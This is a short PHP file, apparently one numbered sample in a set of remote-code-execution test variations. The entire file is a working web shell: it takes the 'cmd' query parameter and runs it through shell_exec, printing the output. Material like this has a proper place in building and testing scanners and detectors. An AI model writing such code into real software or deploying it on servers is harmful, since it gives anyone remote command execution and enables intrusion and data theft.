<?php
// RCE test variation #98
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>